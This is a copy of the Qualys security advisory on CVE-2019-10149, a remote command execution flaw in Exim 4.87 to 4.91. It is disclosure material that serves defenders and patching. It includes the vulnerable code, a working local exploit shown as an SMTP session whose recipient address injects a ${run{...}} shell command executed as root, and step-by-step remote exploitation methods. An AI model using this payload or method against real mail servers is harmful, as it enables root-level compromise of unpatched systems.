@@ -1,0 +1,316 @@
+
+Date: Thu, 6 Jun 2019 17:51:29 +0000
+From: Qualys Security Advisory <qsa@...lys.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Re: CVE-2019-10149: Exim 4.87 to 4.91: possible remote
+ exploit
+
+
+Qualys Security Advisory
+
+The Return of the WIZard: RCE in Exim (CVE-2019-10149)
+
+
+========================================================================
+Contents
+========================================================================
+
+Summary
+Local exploitation
+Remote exploitation
+- Non-default configurations
+- Default configuration
+Acknowledgments
+Timeline
+
+    Boromir: "What is this new devilry?"
+    Gandalf: "A Balrog. A demon of the Ancient World."
+        -- The Lord of the Rings: The Fellowship of the Ring
+
+
+========================================================================
+Summary
+========================================================================
+
+During a code review of the latest changes in the Exim mail server
+(https://en.wikipedia.org/wiki/Exim), we discovered an RCE vulnerability
+in versions 4.87 to 4.91 (inclusive). In this particular case, RCE means
+Remote *Command* Execution, not Remote Code Execution: an attacker can
+execute arbitrary commands with execv(), as root; no memory corruption
+or ROP (Return-Oriented Programming) is involved.
+
+This vulnerability is exploitable instantly by a local attacker (and by
+a remote attacker in certain non-default configurations). To remotely
+exploit this vulnerability in the default configuration, an attacker
+must keep a connection to the vulnerable server open for 7 days (by
+transmitting one byte every few minutes). However, because of the
+extreme complexity of Exim's code, we cannot guarantee that this
+exploitation method is unique; faster methods may exist.
+
+Exim is vulnerable by default since version 4.87 (released on April 6,
+2016), when #ifdef EXPERIMENTAL_EVENT became #ifndef DISABLE_EVENT; and
+older versions may also be vulnerable if EXPERIMENTAL_EVENT was enabled
+manually. Surprisingly, this vulnerability was fixed in version 4.92
+(released on February 10, 2019):
+
+https://github.com/Exim/exim/commit/7ea1237c783e380d7bdb86c90b13d8203c7ecf26
+https://bugs.exim.org/show_bug.cgi?id=2310
+
+but was not identified as a security vulnerability, and most operating
+systems are therefore affected. For example, we exploit an up-to-date
+Debian distribution (9.9) in this advisory.
+
+
+========================================================================
+Local exploitation
+========================================================================
+
+The vulnerable code is located in deliver_message():
+
+6122 #ifndef DISABLE_EVENT
+6123       if (process_recipients != RECIP_ACCEPT)
+6124         {
+6125         uschar * save_local =  deliver_localpart;
+6126         const uschar * save_domain = deliver_domain;
+6127
+6128         deliver_localpart = expand_string(
+6129                       string_sprintf("${local_part:%s}", new->address));
+6130         deliver_domain =    expand_string(
+6131                       string_sprintf("${domain:%s}", new->address));
+6132
+6133         (void) event_raise(event_action,
+6134                       US"msg:fail:internal", new->message);
+6135
+6136         deliver_localpart = save_local;
+6137         deliver_domain =    save_domain;
+6138         }
+6139 #endif
+
+Because expand_string() recognizes the "${run{<command> <args>}}"
+expansion item, and because new->address is the recipient of the mail
+that is being delivered, a local attacker can simply send a mail to
+"${run{...}}@...alhost" (where "localhost" is one of Exim's
+local_domains) and execute arbitrary commands, as root
+(deliver_drop_privilege is false, by default):
+
+john@...ian:~$ cat /tmp/id
+cat: /tmp/id: No such file or directory
+
+john@...ian:~$ nc 127.0.0.1 25
+220 debian ESMTP Exim 4.89 Thu, 23 May 2019 09:10:41 -0400
+HELO localhost
+250 debian Hello localhost [127.0.0.1]
+MAIL FROM:<>
+250 OK
+RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@...alhost>
+250 Accepted
+DATA
+354 Enter message, ending with "." on a line by itself
+Received: 1
+Received: 2
+Received: 3
+Received: 4
+Received: 5
+Received: 6
+Received: 7
+Received: 8
+Received: 9
+Received: 10
+Received: 11
+Received: 12
+Received: 13
+Received: 14
+Received: 15
+Received: 16
+Received: 17
+Received: 18
+Received: 19
+Received: 20
+Received: 21
+Received: 22
+Received: 23
+Received: 24
+Received: 25
+Received: 26
+Received: 27
+Received: 28
+Received: 29
+Received: 30
+Received: 31
+
+.
+250 OK id=1hTnYa-0000zp-8b
+QUIT
+221 debian closing connection
+
+john@...ian:~$ cat /tmp/id
+cat: /tmp/id: Permission denied
+
+root@...ian:~# cat /tmp/id
+uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)
+uid=0(root) gid=111(Debian-exim) groups=111(Debian-exim)
+
+In this example:
+
+- we send more than received_headers_max (30, by default) "Received:"
+  headers to the mail server, to set process_recipients to
+  RECIP_FAIL_LOOP and hence execute the vulnerable code;
+
+- we escape invalid characters in the recipient's address with
+  backslashes, which are conveniently interpreted by expand_string() (in
+  expand_string_internal() and transport_set_up_command()).
+
+
+========================================================================
+Remote exploitation
+========================================================================
+
+Our local-exploitation method does not work remotely, because the
+"verify = recipient" ACL (Access-Control List) in Exim's default
+configuration requires the local part of the recipient's address (the
+part that precedes the @ sign) to be the name of a local user:
+
+john@...ian:~$ nc 192.168.56.101 25
+220 debian ESMTP Exim 4.89 Thu, 23 May 2019 10:06:37 -0400
+HELO localhost
+250 debian Hello localhost [192.168.56.101]
+MAIL FROM:<>
+250 OK
+RCPT TO:<${run{\x2Fbin\x2Fsh\t-c\t\x22id\x3E\x3E\x2Ftmp\x2Fid\x22}}@...alhost>
+550 Unrouteable address
+
+------------------------------------------------------------------------
+Non-default configurations
+------------------------------------------------------------------------
+
+We eventually devised an elaborate method for exploiting Exim remotely
+in its default configuration, but we first identified various
+non-default configurations that are easy to exploit remotely:
+
+- If the "verify = recipient" ACL was removed manually by an
+  administrator (maybe to prevent username enumeration via RCPT TO),
+  then our local-exploitation method also works remotely.
+
+- If Exim was configured to recognize tags in the local part of the
+  recipient's address (via "local_part_suffix = +* : -*" for example),
+  then a remote attacker can simply reuse our local-exploitation method
+  with an RCPT TO "balrog+${run{...}}@...alhost" (where "balrog" is the
+  name of a local user).
+
+- If Exim was configured to relay mail to a remote domain, as a
+  secondary MX (Mail eXchange), then a remote attacker can simply reuse
+  our local-exploitation method with an RCPT TO "${run{...}}@...zad.dum"
+  (where "khazad.dum" is one of Exim's relay_to_domains). Indeed, the
+  "verify = recipient" ACL can only check the domain part of a remote
+  address (the part that follows the @ sign), not the local part.
+
+------------------------------------------------------------------------
+Default configuration
+------------------------------------------------------------------------
+
+First, we solve the "verify = recipient" ACL problem with a "bounce"
+message: if we send a mail that cannot be delivered, Exim automatically
+sends a delivery-failure message (a "bounce") to the original sender. In
+other words, the sender of our original mail (our MAIL FROM) becomes the
+recipient of the bounce (its RCPT TO) and can therefore execute commands
+with "${run{...}}". Indeed, the "verify = sender" ACL in Exim's default
+configuration can only check the domain part of our original sender
+address, not its local part (because it is a remote address).
+
+Next, the bounce must reach the vulnerable code and pass the
+process_recipients != RECIP_ACCEPT test, but we cannot reuse our
+received_headers_max trick because we do not control the bounce's
+headers. Our solution to this second problem is not optimal: if the
+bounce itself cannot be delivered after 7 days (the default
+timeout_frozen_after), then Exim sets process_recipients to
+RECIP_FAIL_TIMEOUT and executes the vulnerable code.
+
+Last, we must solve a seemingly intractable problem: after 2 days (the
+default ignore_bounce_errors_after) the bounce is discarded unless it is
+deferred (by a temporary delivery failure), and after 4 days the default
+retry rule ("F,2h,15m; G,16h,1h,1.5; F,4d,6h") turns deferred addresses
+into failed addresses, and hence discards the bounce before the 7 days
+of timeout_frozen_after. Below is our solution to this third problem,
+and to the remote-exploitation problem in general (but simpler and
+faster solutions may exist):
+
+1/ We connect to the vulnerable Exim server and send a mail that cannot
+be delivered (because we send more than received_headers_max "Received:"
+headers). The recipient address (RCPT TO) of our mail is "postmaster",
+and its sender address (MAIL FROM) is "${run{...}}@...zad.dum" (where
+"khazad.dum" is a domain that is under our control).
+
+2/ Because our mail cannot be delivered, Exim connects to khazad.dum's
+MX (where we listen for and accept this connection) and starts sending a
+bounce message to "${run{...}}@...zad.dum".
+
+3/ We keep this connection open for 7 days (the default
+timeout_frozen_after), by sending a byte to Exim every 4 minutes. This
+works because Exim reads the response to its SMTP commands (Simple Mail
+Transfer Protocol) into a 4096-byte buffer (DELIVER_BUFFER_SIZE) with a
+5-minute timeout (the default command_timeout) that is reset every time
+a byte is read.
+
+4/ After 7 days, we complete our lengthy SMTP response with a permanent
+delivery failure (for example, "550 Unrouteable address") which freezes
+the bounce in post_process_one(). This function should actually discard
+the bounce instead of freezing it (which would prevent us from reaching
+the vulnerable code) because it is older than 2 days (the default
+ignore_bounce_errors_after):
+
+1613   /* If this is a delivery error, or a message for which no replies are
+1614   wanted, and the message's age is greater than ignore_bounce_errors_after,
+1615   force the af_ignore_error flag. This will cause the address to be discarded
+1616   later (with a log entry). */
+1617
+1618   if (!*sender_address && message_age >= ignore_bounce_errors_after)
+1619     setflag(addr, af_ignore_error);
+
+However, in this particular case, message_age is not the bounce's real
+age (over 7 days) but its age when it was first loaded from Exim's spool
+(when it was just a few seconds or minutes old).
+
+5/ Finally, Exim's next queue run (every 30 minutes by default, on
+Debian) loads the frozen bounce from the spool, sets process_recipients
+to RECIP_FAIL_TIMEOUT (this time, message_age is the bounce's real age,
+over 7 days), and executes the vulnerable code and our commands (our
+original sender address, "${run{...}}@...zad.dum", is the bounce's
+recipient address, which is interpreted by expand_string()).
+
+Note: to quickly test this remote-exploitation method, the days in
+Exim's default timeout_frozen_after and ignore_bounce_errors_after can
+be replaced by hours, and the default retry rule by "F,4h,6m".
+
+
+========================================================================
+Acknowledgments
+========================================================================
+
+We thank Exim's developers, Solar Designer, and the members of
+distros@...nwall.
+
+"The Return of the WIZard" is a reference to Sendmail's ancient WIZ and
+DEBUG vulnerabilities:
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0145
+https://seclists.org/bugtraq/1995/Feb/56
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0095
+http://www.cheswick.com/ches/papers/berferd.pdf
+
+
+========================================================================
+Timeline
+========================================================================
+
+2019-05-27: Advisory sent to security@...m.
+
+2019-05-28: Advisory sent to distros@...nwall.
+
+
+
+[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
+
+
+
+This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.
